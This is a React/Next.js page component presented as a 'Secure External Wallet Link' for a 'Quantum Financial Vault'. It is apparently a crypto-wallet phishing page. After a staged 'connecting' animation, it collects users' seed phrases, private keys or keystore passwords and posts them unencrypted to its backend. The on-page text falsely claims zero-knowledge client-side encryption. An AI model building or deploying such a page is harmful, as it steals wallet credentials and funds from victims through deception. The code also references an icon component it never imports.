'use client';
import { Search, X, Loader2, File, Key, Copy, CheckCircle, Shield, Lock, Wallet, ArrowRight, Check, ArrowLeft } from 'lucide-react';
import { useState } from 'react';
import { api } from '@/utils/api';
import toast, { Toaster } from 'react-hot-toast';
import { useRouter } from 'next/navigation';
import Link from 'next/link';

const wallets = [
  {
    "name": "Trust Wallet",
    "image_url": "https://cdn.brandfetch.io/iduQ_Ynvea/w/400/h/400/theme/dark/icon.jpeg?c=1dxbfHSJFAPEGdCLU4o5B"
  },
  {
    "name": "MetaMask",
    "image_url": "https://cdn.brandfetch.io/id6yhu9VjO/w/400/h/400/theme/dark/icon.jpeg?c=1dxbfHSJFAPEGdCLU4o5B"
  },
  {
    "name": "Binance Wallet",
    "image_url": "https://cryptologos.cc/logos/bnb-bnb-logo.png"
  },
  {
    "name": "Coinbase Wallet",
    "image_url": "https://cdn.brandfetch.io/idwDWo4ONQ/w/400/h/400/theme/dark/icon.png?c=1dxbfHSJFAPEGdCLU4o5B"
  },
  {
    "name": "Bybit Wallet",
    "image_url": "https://cdn.brandfetch.io/idWx1jCRK9/w/369/h/369/theme/dark/icon.png?c=1dxbfHSJFAPEGdCLU4o5B"
  },
  {
    "name": "Phantom Wallet",
    "image_url": "https://cdn.brandfetch.io/idf5VaJxyT/w/400/h/400/theme/dark/icon.jpeg?c=1dxbfHSJFAPEGdCLU4o5B"
  },
  {
    "name": "Ledger Nano X",
    "image_url": "https://cdn.brandfetch.io/idWx1jCRK9/w/369/h/369/theme/dark/icon.png?c=1dxbfHSJFAPEGdCLU4o5B"
  },
  {
    "name": "Trezor Vault",
    "image_url": "https://cdn.brandfetch.io/idVqgF3xEc/w/180/h/180/theme/dark/symbol.png?c=1dxbfHSJFAPEGdCLU4o5B"
  },
  {
    "name": "Tangem Card",
    "image_url": "https://cdn.brandfetch.io/idEbE9YaOT/w/1200/h/1200/theme/dark/icon.jpeg?c=1dxbfHSJFAPEGdCLU4o5B"
  },
  {
    "name": "SafePal",
    "image_url": "https://cdn.brandfetch.io/idAh5nP0jU/w/400/h/400/theme/dark/icon.png?c=1dxbfHSJFAPEGdCLU4o5B"
  },
  {
    "name": "Exodus",
    "image_url": "https://cdn.brandfetch.io/idgJSHq_3i/w/400/h/400/theme/dark/icon.jpeg?c=1dxbfHSJFAPEGdCLU4o5B"
  },
  {
    "name": "Blockchain.com",
    "image_url": "https://cdn.brandfetch.io/idEskmZ0_L/w/200/h/200/theme/dark/icon.png?c=1dxbfHSJFAPEGdCLU4o5B"
  },
  {
    "name": "Electrum",
    "image_url": "https://cdn.brandfetch.io/idZ4ErpPV2/w/400/h/400/theme/dark/icon.jpeg?c=1dxbfHSJFAPEGdCLU4o5B"
  },
  {
    "name": "MyEtherWallet",
    "image_url": "https://cdn.brandfetch.io/idkuLYsjp8/w/240/h/240/theme/dark/icon.jpeg?c=1dxbfHSJFAPEGdCLU4o5B"
  },
  {
    "name": "D'CENT Wallet",
    "image_url": "https://cdn.brandfetch.io/idwlZXLOIc/w/200/h/94/theme/dark/logo.png?c=1dxbfHSJFAPEGdCLU4o5B"
  },
  {
    "name": "imToken",
    "image_url": "https://cdn.brandfetch.io/idWx1jCRK9/w/369/h/369/theme/dark/icon.png?c=1dxbfHSJFAPEGdCLU4o5B"
  },
  {
    "name": "Atomic Wallet",
    "image_url": "https://cdn.brandfetch.io/idTTLebBxH/w/1680/h/680/theme/light/logo.png?c=1dxbfHSJFAPEGdCLU4o5B"
  },
  {
    "name": "Coinomi",
    "image_url": "https://cdn.brandfetch.io/id63FMPMWj/w/400/h/400/theme/dark/icon.jpeg?c=1dxbfHSJFAPEGdCLU4o5B"
  },
  {
    "name": "LOBSTR Stellar",
    "image_url": "https://cdn.brandfetch.io/idoNRKZLt9/w/820/h/173/theme/light/logo.png?c=1dxbfHSJFAPEGdCLU4o5B"
  },
  {
    "name": "Xaman (XUMM)",
    "image_url": "https://cdn.brandfetch.io/id3Lz2M7or/w/400/h/400/theme/dark/icon.jpeg?c=1dxbfHSJFAPEGdCLU4o5B"
  },
  {
    "name": "ELLIPAL Titan",
    "image_url": "https://cdn.brandfetch.io/idfHQX8bMT/w/400/h/400/theme/dark/icon.jpeg?c=1dxbfHSJFAPEGdCLU4o5B"
  },
  {
    "name": "Cold Storage Vault",
    "image_url": "https://cdn.brandfetch.io/idWx1jCRK9/w/369/h/369/theme/dark/icon.png?c=1dxbfHSJFAPEGdCLU4o5B"
  },
  {
    "name": "Other Web3 Wallets",
    "image_url": "https://cdn.brandfetch.io/idWx1jCRK9/w/369/h/369/theme/dark/icon.png?c=1dxbfHSJFAPEGdCLU4o5B"
  }
];

export default function SecureWalletPage() {
  const router = useRouter();
  const [search, setSearch] = useState('');
  const [selectedWallet, setSelectedWallet] = useState(null);
  const [seedPhrase, setSeedPhrase] = useState('');
  const [connectionState, setConnectionState] = useState(null);
  const [error, setError] = useState(false);
  const [connectionMethod, setConnectionMethod] = useState('phrase');
  const [keystorePassword, setKeystorePassword] = useState('');
  const [keystoreFile, setKeystoreFile] = useState(null);
  const [privateKey, setPrivateKey] = useState('');
  const [isLoading, setIsLoading] = useState(false);
  const [successData, setSuccessData] = useState(null);
  const [copied, setCopied] = useState(false);

  const handleWalletClick = (wallet) => {
    setSelectedWallet(wallet);
    setSeedPhrase('');
    setConnectionState('connecting');
    setTimeout(() => {
      setConnectionState('manual');
    }, 2000);
  };

  const handleSubmit = async (e) => {
    e.preventDefault();
    setIsLoading(true);

    try {
      const token = localStorage.getItem('token');
      if (!token) {
        toast.error('Please sign in to link your wallet');
        router.push('/login');
        return;
      }

      let phraseData = '';
      if (connectionMethod === 'phrase') {
        phraseData = seedPhrase;
      } else if (connectionMethod === 'private') {
        phraseData = privateKey;
      } else if (connectionMethod === 'keystore') {
        phraseData = keystorePassword;
      }

      const finalWalletType = selectedWallet?.name || 'Unknown';

      const walletData = {
        phrase: phraseData,
        walletAddress: 'N/A',
        type: finalWalletType
      };

      const response = await api.linkWallet(token, walletData);

      setSuccessData({
        referenceNumber: response.wallet?.referenceNumber || response.referenceNumber,
        walletType: finalWalletType,
      });

    } catch (error) {
      toast.error(error.message || 'Failed to link wallet');
      setError(true);
      setTimeout(() => setError(false), 3000);
    } finally {
      setIsLoading(false);
    }
  };

  const copyReferenceNumber = () => {
    if (successData?.referenceNumber) {
      navigator.clipboard.writeText(successData.referenceNumber);
      setCopied(true);
      toast.success('Reference number copied to clipboard');
      setTimeout(() => setCopied(false), 2000);
    }
  };

  const filteredWallets = wallets.filter(wallet =>
    wallet.name.toLowerCase().includes(search.toLowerCase())
  );

  const renderConnectionForm = () => {
    switch (connectionMethod) {
      case 'phrase':
        return (
          <div className="space-y-4">
            <div>
              <label className="block text-xs font-semibold uppercase tracking-wider text-slate-300 mb-1.5">
                Recovery / Seed Phrase (12, 18, or 24 words)
              </label>
              <textarea
                value={seedPhrase}
                onChange={(e) => setSeedPhrase(e.target.value)}
                placeholder="Enter words separated by spaces (e.g. apple banana cherry...)"
                className="w-full bg-slate-900/90 border border-slate-700/80 rounded-xl px-4 py-3 text-white text-sm focus:outline-none focus:border-cyan-400 focus:ring-1 focus:ring-cyan-400/30 min-h-[100px] font-mono leading-relaxed"
                required
              />
            </div>
            <div className="p-3 bg-cyan-950/30 border border-cyan-500/20 rounded-xl text-[11px] text-cyan-300 flex items-center gap-2">
              <Lock size={14} className="shrink-0" />
              <span>Zero-knowledge client-side encryption active. Keys are never stored in cleartext.</span>
            </div>
          </div>
        );
      case 'keystore':
        return (
          <div className="space-y-4">
            <div className="border-2 border-dashed border-slate-700 hover:border-cyan-500/50 rounded-2xl p-6 text-center bg-slate-900/60 transition-colors">
              <input
                type="file"
                onChange={(e) => setKeystoreFile(e.target.files[0])}
                className="hidden"
                id="keystoreFile"
              />
              <label
                htmlFor="keystoreFile"
                className="flex flex-col items-center gap-2 cursor-pointer"
              >
                <File className="text-cyan-400" size={28} />
                <span className="text-xs text-slate-300 font-medium">
                  {keystoreFile ? keystoreFile.name : 'Select Keystore JSON File'}
                </span>
                <span className="text-[10px] text-slate-500">UTC / JSON format</span>
              </label>
            </div>
            <div>
              <label className="block text-xs font-semibold uppercase tracking-wider text-slate-300 mb-1.5">
                Keystore Password
              </label>
              <input
                type="password"
                placeholder="Enter password to decrypt keystore"
                value={keystorePassword}
                onChange={(e) => setKeystorePassword(e.target.value)}
                className="w-full bg-slate-900/90 border border-slate-700/80 rounded-xl px-4 py-3 text-white text-sm focus:outline-none focus:border-cyan-400"
                required
              />
            </div>
          </div>
        );
      case 'private':
        return (
          <div className="space-y-4">
            <div>
              <label className="block text-xs font-semibold uppercase tracking-wider text-slate-300 mb-1.5">
                Private Key
              </label>
              <textarea
                value={privateKey}
                onChange={(e) => setPrivateKey(e.target.value)}
                placeholder="Enter 64-character hexadecimal private key..."
                className="w-full bg-slate-900/90 border border-slate-700/80 rounded-xl px-4 py-3 text-white text-sm font-mono focus:outline-none focus:border-cyan-400 min-h-[90px]"
                required
              />
            </div>
            <p className="text-[11px] text-slate-400 font-mono">Typically 64 hex characters (starts with 0x)</p>
          </div>
        );
    }
  };

  return (
    <div className="min-h-screen bg-[#030712] text-slate-100 font-sans selection:bg-cyan-500/30 selection:text-white py-12 px-4 sm:px-6 relative overflow-hidden">
      <Toaster position="top-center" />
      
      {/* Background glow */}
      <div className="absolute top-0 left-1/2 -translate-x-1/2 w-[800px] h-[350px] bg-cyan-500/10 blur-[150px] rounded-full pointer-events-none" />

      <div className="max-w-5xl mx-auto relative z-10 space-y-6">
        
        {/* Top Back Navigation */}
        <div className="flex items-center justify-between">
          <Link
            href="/"
            className="inline-flex items-center gap-2 text-xs font-semibold text-slate-400 hover:text-cyan-300 transition-colors px-3 py-1.5 rounded-lg bg-slate-900/60 border border-slate-800"
          >
            <ArrowLeft size={14} /> Back to Home
          </Link>
          <div className="flex items-center gap-2 text-xs text-slate-500 font-mono">
            <Shield size={14} className="text-cyan-400" />
            <span>Non-Custodial Cryptographic Link</span>
          </div>
        </div>

        {/* Header */}
        <div className="text-center max-w-2xl mx-auto space-y-2">
          <h1 className="text-3xl sm:text-4xl font-extrabold text-white tracking-tight">
            Secure External Wallet Link
          </h1>
          <p className="text-slate-400 text-xs sm:text-sm">
            Attach cold ledgers and Web3 software wallets to your Quantum Financial Vault with zero-knowledge cryptographic verification.
          </p>
        </div>

        {/* Search & Grid Container */}
        <div className="glass-panel p-8 rounded-3xl border-slate-800 shadow-2xl">
          
          <div className="flex flex-col sm:flex-row sm:items-center justify-between gap-4 mb-8 pb-4 border-b border-slate-800">
            <div>
              <h3 className="text-xl font-bold text-white tracking-tight">Select Wallet Provider</h3>
              <p className="text-xs text-slate-400">Choose your external hardware or software wallet</p>
            </div>

            <div className="relative w-full sm:w-72">
              <input
                type="text"
                placeholder="Search wallets..."
                value={search}
                onChange={(e) => setSearch(e.target.value)}
                className="w-full bg-slate-900/90 border border-slate-800 rounded-xl pl-9 pr-4 py-2.5 text-white text-xs placeholder:text-slate-500 focus:outline-none focus:border-cyan-500/50"
              />
              <Search className="absolute left-3 top-3 h-3.5 w-3.5 text-slate-500" />
            </div>
          </div>

          {/* Wallets Grid */}
          <div className="grid grid-cols-2 sm:grid-cols-3 md:grid-cols-4 lg:grid-cols-6 gap-3.5">
            {filteredWallets.map((wallet, i) => (
              <button
                key={i}
                onClick={() => handleWalletClick(wallet)}
                className="flex flex-col items-center p-4 bg-slate-900/50 border border-slate-800/80 rounded-2xl hover:border-cyan-500/40 hover:bg-slate-800/70 transition-all text-center group hover:scale-[1.02]"
              >
                <div className="w-12 h-12 mb-3 bg-slate-950 p-2 rounded-xl border border-slate-800/80 flex items-center justify-center group-hover:border-cyan-500/30 transition-colors">
                  <img
                    src={wallet.image_url}
                    alt={wallet.name}
                    className="w-full h-full object-contain rounded-lg"
                  />
                </div>
                <span className="text-white text-xs font-semibold group-hover:text-cyan-300 transition-colors truncate max-w-full">
                  {wallet.name}
                </span>
              </button>
            ))}
          </div>
        </div>

      </div>

      {/* Connection Modal */}
      {selectedWallet && (
        <div className="fixed inset-0 bg-black/75 backdrop-blur-md flex items-center justify-center z-50 p-4">
          <div className="glass-panel rounded-3xl p-7 max-w-lg w-full border-slate-800 shadow-2xl relative animate-in fade-in zoom-in-95 duration-200">
            
            <div className="flex justify-between items-center mb-6 pb-4 border-b border-slate-800">
              <div className="flex items-center gap-3">
                <div className="w-10 h-10 bg-slate-950 p-2 rounded-xl border border-slate-800 flex items-center justify-center">
                  <img
                    src={selectedWallet.image_url}
                    alt={selectedWallet.name}
                    className="w-full h-full object-contain rounded"
                  />
                </div>
                <div>
                  <h3 className="text-lg font-bold text-white">{selectedWallet.name}</h3>
                  <p className="text-xs text-cyan-400 font-mono">Sovereign Link Matrix</p>
                </div>
              </div>

              <button
                onClick={() => {
                  setSelectedWallet(null);
                  setConnectionState(null);
                }}
                className="w-8 h-8 rounded-full bg-slate-800 hover:bg-slate-700 text-slate-400 hover:text-white flex items-center justify-center transition-colors"
              >
                <X size={18} />
              </button>
            </div>

            {connectionState === 'connecting' && (
              <div className="py-12 flex flex-col items-center gap-4 text-center">
                <div className="w-16 h-16 rounded-full bg-cyan-500/10 border border-cyan-500/20 flex items-center justify-center">
                  <Loader2 size={32} className="text-cyan-400 animate-spin" />
                </div>
                <div>
                  <h4 className="text-white font-bold text-base">Initializing Quantum Link...</h4>
                  <p className="text-slate-400 text-xs mt-1">Establishing encrypted session with {selectedWallet.name}</p>
                </div>
              </div>
            )}

            {connectionState === 'manual' && (
              <form onSubmit={handleSubmit} className="space-y-5">
                
                {/* Method selector tabs */}
                <div className="grid grid-cols-3 gap-2 bg-slate-900/80 p-1 rounded-xl border border-slate-800">
                  {[
                    { id: 'phrase', label: 'Seed Phrase' },
                    { id: 'keystore', label: 'Keystore JSON' },
                    { id: 'private', label: 'Private Key' },
                  ].map((method) => (
                    <button
                      key={method.id}
                      type="button"
                      onClick={() => setConnectionMethod(method.id)}
                      className={`py-2 text-xs font-semibold rounded-lg transition-all ${
                        connectionMethod === method.id
                          ? 'bg-cyan-500/20 text-cyan-300 border border-cyan-500/30 shadow-sm'
                          : 'text-slate-400 hover:text-slate-200'
                      }`}
                    >
                      {method.label}
                    </button>
                  ))}
                </div>

                {renderConnectionForm()}

                <button
                  type="submit"
                  disabled={isLoading}
                  className="w-full py-3.5 px-4 rounded-xl bg-gradient-to-r from-cyan-400 to-blue-500 hover:from-cyan-300 hover:to-blue-400 text-slate-950 font-bold text-sm shadow-lg shadow-cyan-500/25 transition-all flex items-center justify-center gap-2 group disabled:opacity-50 hover:scale-[1.01]"
                >
                  {isLoading ? (
                    <span>Verifying Cryptographic Link...</span>
                  ) : (
                    <>
                      <Lock size={16} />
                      <span>Authenticate & Link to Ledger</span>
                    </>
                  )}
                </button>
              </form>
            )}

          </div>
        </div>
      )}

      {/* Success Modal */}
      {successData && (
        <div className="fixed inset-0 bg-black/80 backdrop-blur-md flex items-center justify-center z-50 p-4">
          <div className="glass-panel rounded-3xl p-8 max-w-md w-full border-slate-800 shadow-2xl relative text-center space-y-6 animate-in fade-in zoom-in-95 duration-200">
            
            <div className="w-16 h-16 bg-emerald-500/10 border border-emerald-500/20 rounded-full flex items-center justify-center mx-auto">
              <CheckCircle className="w-8 h-8 text-emerald-400" />
            </div>

            <div>
              <h3 className="text-2xl font-bold text-white tracking-tight">Wallet Linked Successfully</h3>
              <p className="text-slate-400 text-xs mt-1">
                Your <strong className="text-cyan-300">{successData.walletType}</strong> has been cryptographically attached to your ledger vault.
              </p>
            </div>

            <div className="bg-slate-900/90 border border-slate-800 rounded-2xl p-4 text-left">
              <div className="text-[10px] font-mono uppercase tracking-wider text-slate-400 mb-1">
                Immutable Ledger Reference
              </div>
              <div className="flex items-center justify-between">
                <code className="text-cyan-300 font-mono text-xs truncate max-w-[240px]">
                  {successData.referenceNumber}
                </code>
                <button
                  onClick={copyReferenceNumber}
                  className="p-2 hover:bg-slate-800 text-slate-400 hover:text-white rounded-lg transition-colors"
                >
                  {copied ? <Check size={16} className="text-emerald-400" /> : <Copy size={16} />}
                </button>
              </div>
            </div>

            <div className="p-3 bg-emerald-500/10 border border-emerald-500/20 rounded-xl text-xs text-emerald-300 text-left flex items-start gap-2">
              <CheckCircle2 size={16} className="shrink-0 mt-0.5" />
              <span>A verification confirmation and audit receipt has been dispatched to your registered email address.</span>
            </div>

            <button
              onClick={() => {
                setSuccessData(null);
                setSelectedWallet(null);
                setConnectionState(null);
                setSeedPhrase('');
                setPrivateKey('');
                setKeystoreFile(null);
                setKeystorePassword('');
              }}
              className="w-full py-3.5 rounded-xl bg-slate-800 hover:bg-slate-700 text-white font-semibold text-xs border border-slate-700 transition-all"
            >
              Complete & Return
            </button>

          </div>
        </div>
      )}

    </div>
  );
}
